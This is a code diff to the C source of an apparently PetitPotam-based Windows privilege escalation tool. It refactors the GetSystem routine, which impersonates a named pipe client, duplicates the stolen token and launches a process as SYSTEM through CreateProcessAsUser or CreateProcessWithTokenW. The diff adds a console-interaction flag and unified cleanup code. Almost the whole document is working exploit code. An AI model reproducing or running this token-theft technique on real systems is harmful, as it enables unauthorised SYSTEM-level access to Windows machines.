@@ -11,11 +11,19 @@
 #pragma comment(lib, "RpcRT4.lib")
 #pragma comment(lib, "userenv.lib")
 
+
 HANDLE CreatePetitNamedPipe();
+
 HANDLE ConnectPetitNamedPipe(HANDLE hNamedPipe);
+
 DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam);
+
 void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine);
+
 void PetitPotamConnect(DWORD EfsID);
+
+BOOL g_bInteractWithConsole = TRUE;
+
 
 void _tmain(int argc, TCHAR* argv[])
 {
@@ -99,6 +107,7 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
     HANDLE hToken = NULL;
     HANDLE phNewToken = NULL;
 
+    DWORD dwCreationFlags = 0;
     LPWSTR lpCurrentDirectory = NULL;
     LPVOID lpEnvironment = NULL;
 
@@ -109,84 +118,95 @@ void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
 
     if (ImpersonateNamedPipeClient(hNamedPipe))
     {
-        printf("[+] ImpersonateNamedPipeClient success.\n");
+        printf("[+] ImpersonateNamedPipeClient OK.\n");
     }
     else
     {
         printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
     if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
     {
-        printf("[+] OpenThreadToken success.\n");
+        printf("[+] OpenThreadToken OK.\n");
     }
     else
     {
         printf("[-] OpenThreadToken() Error: %i.\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
     if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken))
     {
-        printf("[+] DuplicateTokenEx success.\n");
+        printf("[+] DuplicateTokenEx OK.\n");
     }
     else
     {
         printf("[-] DupicateTokenEx() Error: %i.\n", GetLastError());
-        return;
+        goto cleanup;
     }
+
+    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
+    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
 
     if (!(lpCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
     {
-        return;
+        goto cleanup;
     }
 
     if (!GetSystemDirectory(lpCurrentDirectory, MAX_PATH))
     {
         printf("[-] GetSystemDirectory() Error: %i.\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
     if (!CreateEnvironmentBlock(&lpEnvironment, phNewToken, FALSE))
     {
         printf("[-] CreateEnvironmentBlock() Error: %i.\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
-    if (CreateProcessAsUser(phNewToken, NULL, lpCommandLine, NULL, NULL, TRUE, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpCurrentDirectory, &si, &pi))
+    if (CreateProcessAsUser(phNewToken, NULL, lpCommandLine, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
     {
-        printf("[+] CreateProcessAsUser success.\n");
-
-        CloseHandle(hToken);
-        CloseHandle(phNewToken);
-
-        return;
+        printf("[+] CreateProcessAsUser OK.\n");
     }
     else if (GetLastError() != NULL)
     {   
         RevertToSelf();
         printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");
         
-        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, lpEnvironment, lpCurrentDirectory, &si, &pi))
+        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
         {
-            printf("[+] CreateProcessWithTokenW success.\n");
-
-            CloseHandle(hToken);
-            CloseHandle(phNewToken);
-
-            return;
+            printf("[+] CreateProcessWithTokenW OK.\n");
         }
         else
         {
             printf("[-] CreateProcessWithTokenW failed (%d).\n", GetLastError());
-
-            CloseHandle(hToken);
-            CloseHandle(phNewToken);
-
-            return;
+            goto cleanup;
         }
     }
+
+    if (g_bInteractWithConsole)
+    {
+        fflush(stdout);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+    }
+
+cleanup:
+    if (hToken)
+        CloseHandle(hToken);
+    if (phNewToken)
+        CloseHandle(phNewToken);
+    if (lpCurrentDirectory)
+        free(lpCurrentDirectory);
+    if (lpEnvironment)
+        DestroyEnvironmentBlock(lpEnvironment);
+    if (pi.hProcess)
+        CloseHandle(pi.hProcess);
+    if (pi.hThread)
+        CloseHandle(pi.hThread);
+
+    return;
 }
 
 
